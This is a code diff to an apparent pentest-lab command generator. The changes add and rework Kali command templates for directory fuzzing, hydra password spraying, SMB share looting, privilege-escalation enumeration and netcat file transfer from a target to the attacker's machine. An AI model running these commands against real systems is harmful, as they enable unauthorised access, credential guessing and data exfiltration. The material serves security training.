@@ -667,8 +667,10 @@ lab</textarea>
       "shell32.exe",
       "shell64.exe",
       "ligolo-agent.exe",
-      "winPEASx64.exe",
+      "suid3num.py",
+      "pspy64",
       "linpeas.sh",
+      "winPEASx64.exe",
       "PowerUp.ps1",
       "mimikatz.exe",
       "SharpHound.exe",
@@ -702,37 +704,27 @@ lab</textarea>
         ]
       },
       {
-        id: "Gobuster",
-        title: "Gobuster",
-        nav: "Gobuster",
-        group: "Enumeration",
-        options: [
-          { id: "gobusterPath", type: "text", label: "URL path / output suffix", placeholder: "api" },
-          { id: "gobusterWordlist", type: "combo", label: "Wordlist", defaultValue: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt", choices: [
-            { value: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt" },
-            { value: "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" }
-          ] },
-          { id: "gobusterPort", type: "checkbox", label: "Add :{port}" },
-          { id: "gobusterProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" },
-          { id: "gobusterExcludeLength", type: "checkbox", label: "Add --exclude-length" },
-          { id: "gobusterExcludeLengthValue", type: "text", label: "Exclude length", placeholder: "290" },
-          { id: "gobusterTls", type: "checkbox", label: "Add -k (skip TLS cert verification)" }
-        ],
-        commands: [
-          { template: "gobuster dir -u {gobusterProtocol}://{target}{gobusterPortFlag}{gobusterPathFlag} -w {gobusterWordlist} -o challenge/{last}/gobuster{gobusterOutputSuffix} -x txt,md,js,html,php,aspx,asp,jsp,conf -b 400,404{gobusterProxyFlag}{gobusterExcludeLengthFlag}{gobusterTlsFlag}" }
-        ]
-      },
-      {
         id: "Webpage",
         title: "Webpage",
         nav: "Webpage",
         group: "Enumeration",
         options: [
-          { id: "webPagePort", type: "checkbox", label: "Add :{port}" }
+          { id: "dirPath", type: "text", label: "URL path / output suffix", placeholder: "api" },
+          { id: "dirWordlist", type: "combo", label: "Wordlist", defaultValue: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt", choices: [
+            { value: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt" },
+            { value: "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" }
+          ] },
+          { id: "dirPort", type: "checkbox", label: "Add :{port}" },
+          { id: "dirProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" },
+          { id: "dirExcludeLength", type: "checkbox", label: "Add --exclude-length" },
+          { id: "dirExcludeLengthValue", type: "text", label: "Exclude length", placeholder: "290" },
+          { id: "dirTls", type: "checkbox", label: "Add -k (skip TLS cert verification)" }
         ],
         commands: [
-          { prefix: "WhatWeb", template: "whatweb http://{target}{webPagePortFlag}" },
-          { prefix: "Curl", template: "curl -i -X OPTIONS http://{target}{webPagePortFlag}" }
+          { prefix: "Gobuster", template: "gobuster dir -u {dirProtocol}://{target}{dirPortFlag}{dirPathFlag} -w {dirWordlist} -o challenge/{last}/gobuster{dirOutputSuffix} --no-error -x txt,md,js,html,php,aspx,asp,jsp,conf -b 400,404{dirProxyFlag}{dirExcludeLengthFlag}{dirTlsFlag}" },
+          { prefix: "Ffuf", template: "ffuf -u http://{target}{dirPortFlag}{dirPathFlag}/FUZZ -w {dirWordlist} -e .txt,.md,.js,.html,.php,.aspx,.asp,.jsp,.conf -fc 400,404 -recursion -recursion-depth 2 -o challenge/{last}/ffuf{dirOutputSuffix}.json" },
+          { prefix: "WhatWeb", template: "whatweb http://{target}{dirPortFlag}" },
+          { prefix: "Curl", template: "curl -i -X OPTIONS http://{target}{dirPortFlag}" }
         ]
       },
       {
@@ -775,7 +767,8 @@ lab</textarea>
           { template: "hydra -t 1{hydraPortFlag} -L users.txt -p '{password}' {service}://{target}" },
           { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P passwords.txt {service}://{target}" },
           { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" },
-          { prefix: "Try default creds", template: "hydra -t 1{hydraPortFlag} -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt {service}://{target}" }
+          { prefix: "Try default creds", template: "hydra -t 1{hydraPortFlag} -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt {service}://{target}" },
+          { prefix: "Try null, reverse, and same password", template: "hydra -t 1{hydraPortFlag} -L users.txt -e nsr {service}://{target}" }
         ]
       },
       {
@@ -823,6 +816,7 @@ lab</textarea>
         ],
         commands: [
           { prefix: "SSH private key passphrase", template: "ssh2john id_rsa > ssh.hash" },
+          { prefix: "Custom wordlist from website", template: "cewl http://{target}/ | grep -v CeWL > custom-wordlist.txt" },
           { prefix: "KeePass password", template: "keepass2john Database.kdbx > keepass.hash" },
           { prefix: "KeePass browse content", template: "kpcli --kdb=Database.kdbx" },
           { prefix: "john", template: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
@@ -913,6 +907,7 @@ lab</textarea>
         commands: [
           { prefix: "List SMB shares", template: "smbclient -L //{target} {smbAuthOption}" },
           { prefix: "Connect to shares", template: "smbclient //{target}/{smbShare} {smbAuthOption}" },
+          { prefix: "Get everything in share", template: "smbclient //{target}/{smbShare} {smbAuthOption} -c 'recurse ON; prompt OFF; mget *'" },
           { prefix: "Execute command", template: "smbclient //{target}/{smbShare} {smbAuthOption} -c '<command>'" },
           { prefix: "Mount share", template: "sudo mount -t cifs //{target}/{smbShare} /home/kali/challenge/mount -o {smbMountAuthOption}uid=$(id -u),gid=$(id -g),file_mode=0644,dir_mode=0755" }
         ]
@@ -1005,6 +1000,12 @@ lab</textarea>
           { prefix: "LinPEAS (env, autorun, cron, SUID, listening ports, files with capabilities)", template: "./linpeas.sh -s 2>&1 | tee linpeas.txt" },
           { prefix: "sudo commmands", template: "sudo -l" },
           { prefix: "Group memberships", template: "id" },
+          { prefix: "Environment variables", template: "env" },
+          { prefix: "Listening ports", template: "netstat -tulnp" },
+          { prefix: "", template: "ss -tulnp" },
+          { prefix: "", template: "lsof -i" },
+          { prefix: "Processes", template: "ps auxww" },
+          { prefix: "Writable files", template: "find / -writable 2>/dev/null | grep -vE '^/(proc|sys|run)'" },
           { prefix: "SUID", template: "find / -perm -4000 -type f 2>/dev/null" },
           { prefix: "Scheduled cron jobs", template: "cat /etc/crontab" },
           { prefix: "Capabilities (cap_setuid, cap_setgid, cap_dac_override, cap_sys_admin, cap_sys_ptrace)", template: "getcap -r / 2>/dev/null" },
@@ -1052,8 +1053,9 @@ lab</textarea>
           { prefix: "Password policy", template: "net accounts" },
           { prefix: "Permission", template: "icacls <path>" },
           { prefix: "Scheduled task", template: "schtasks /query /fo LIST /v" },
-          { prefix: "Process", template: "Get-CimInstance Win32_Process |  Select Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine" },
-          { prefix: "Service", template: "Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, ProcessId, PathName" }
+          { prefix: "Monitor process creation", template: "Register-WmiEvent -Class Win32_ProcessStartTrace -Action {\n    $e = $Event.SourceEventArgs.NewEvent\n    $p = Get-CimInstance Win32_Process -Filter \"ProcessId=$($e.ProcessID)\" -ErrorAction SilentlyContinue\n\n    if ($p) {\n        $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue\n\n        [PSCustomObject]@{\n            Time        = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n            Process     = $e.ProcessName\n            PID         = $e.ProcessID\n            PPID        = $e.ParentProcessID\n            User        = if ($owner.User) { \"$($owner.Domain)\\$($owner.User)\" } else { \"N/A\" }\n            Executable  = $p.ExecutablePath\n            CommandLine = $p.CommandLine\n        } | Format-List\n    }\n}" },
+          { prefix: "Process snapshot", template: "Get-CimInstance Win32_Process |  Select Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine" },
+          { prefix: "Service snapshot", template: "Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, ProcessId, PathName" }
         ]
       },
       {
@@ -1159,7 +1161,7 @@ lab</textarea>
           { prefix: "", template: "put {filename}" },
           { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > {filename}" },
           { prefix: "On Windows target", className: "target", template: "cmd.exe /c \".\\nc.exe {kaliIp} 9001 < {filename}\"" },
-          { prefix: "On Linux target", className: "target", template: "./nc.exe {kaliIp} 9001 < {filename}" },
+          { prefix: "On Linux target", className: "target", template: "nc {kaliIp} 9001 < {filename}" },
           { prefix: "On Kali", className: "kali", template: "python3 -m uploadserver 8000" },
           { prefix: "On target", className: "target", template: "curl.exe -F \"files=@{filename}\" http://{target}:{port}/upload" },
           { prefix: "On Linux target", className: "target", template: "python -m http.server 80" },
@@ -1243,10 +1245,13 @@ lab</textarea>
         title: "Python virtual environment",
         nav: "Python virtual environment",
         commands: [
+          { template: "rm -rf venv" },
           { template: "python3 -m venv venv" },
           { template: "source venv/bin/activate" },
           { template: "pip install uploadserver" },
-          { template: "pip install -r requirements.txt" }
+          { template: "python -m pip install --upgrade pip" },
+          { template: "pip install -r requirements.txt" },
+          { template: "deactivate" }
         ]
       },
       {
@@ -1662,28 +1667,27 @@ lab</textarea>
       values.rpcAuthOption = optionChecked("rpcNullAuth")
         ? `-U "" -N`
         : `-U '${values.smbAuth}'`;
-      const gobusterPath = cleanUrlPath(optionValue("gobusterPath", ""));
-      const gobusterPathSuffix = outputSafeSuffix(gobusterPath);
-      const gobusterPortEnabled = optionChecked("gobusterPort");
-      const gobusterOutputParts = [];
-      if (gobusterPortEnabled && values.port) {
-        gobusterOutputParts.push(outputSafeSuffix(values.port));
+      const dirPath = cleanUrlPath(optionValue("dirPath", ""));
+      const dirPathSuffix = outputSafeSuffix(dirPath);
+      const dirPortEnabled = optionChecked("dirPort");
+      const dirOutputParts = [];
+      if (dirPortEnabled && values.port) {
+        dirOutputParts.push(outputSafeSuffix(values.port));
       }
-      if (gobusterPathSuffix) {
-        gobusterOutputParts.push(gobusterPathSuffix);
+      if (dirPathSuffix) {
+        dirOutputParts.push(dirPathSuffix);
       }
-      values.gobusterPortFlag = gobusterPortEnabled ? `:${values.port}` : "";
-      values.gobusterPathFlag = gobusterPath ? `/${gobusterPath}` : "";
-      values.gobusterOutputSuffix = gobusterOutputParts.length > 0 ? `_${gobusterOutputParts.join("_")}` : "";
-      values.gobusterWordlist = optionValue("gobusterWordlist", "/usr/share/wordlists/dirb/common.txt").trim() || "/usr/share/wordlists/dirb/common.txt";
-      values.gobusterProxyFlag = optionChecked("gobusterProxy") ? " --proxy socks5://127.0.0.1:9999" : "";
-      values.gobusterExcludeLengthFlag = optionChecked("gobusterExcludeLength")
-        ? ` --exclude-length ${optionValue("gobusterExcludeLengthValue", "").trim() || "<length>"}`
+      values.dirPortFlag = dirPortEnabled ? `:${values.port}` : "";
+      values.dirPathFlag = dirPath ? `/${dirPath}` : "";
+      values.dirOutputSuffix = dirOutputParts.length > 0 ? `_${dirOutputParts.join("_")}` : "";
+      values.dirWordlist = optionValue("dirWordlist", "/usr/share/wordlists/dirb/common.txt").trim() || "/usr/share/wordlists/dirb/common.txt";
+      values.dirProxyFlag = optionChecked("dirProxy") ? " --proxy socks5://127.0.0.1:9999" : "";
+      values.dirExcludeLengthFlag = optionChecked("dirExcludeLength")
+        ? ` --exclude-length ${optionValue("dirExcludeLengthValue", "").trim() || "<length>"}`
         : "";
-      values.gobusterTlsFlag = optionChecked("gobusterTls") ? " -k" : "";
-      values.gobusterProtocol = optionChecked("gobusterTls") ? "https" : "http";
+      values.dirTlsFlag = optionChecked("dirTls") ? " -k" : "";
+      values.dirProtocol = optionChecked("dirTls") ? "https" : "http";
       values.ftpTlsFlag = optionChecked("ftpTls") ? " -e 'set ssl:verify-certificate no'" : "";
-      values.webPagePortFlag = optionChecked("webPagePort") ? `:${values.port}` : "";
       const sqlAnonymous = optionChecked("sqlAnonymous");
       values.sqlMysqlAuth = sqlAnonymous
         ? "-u anonymous"
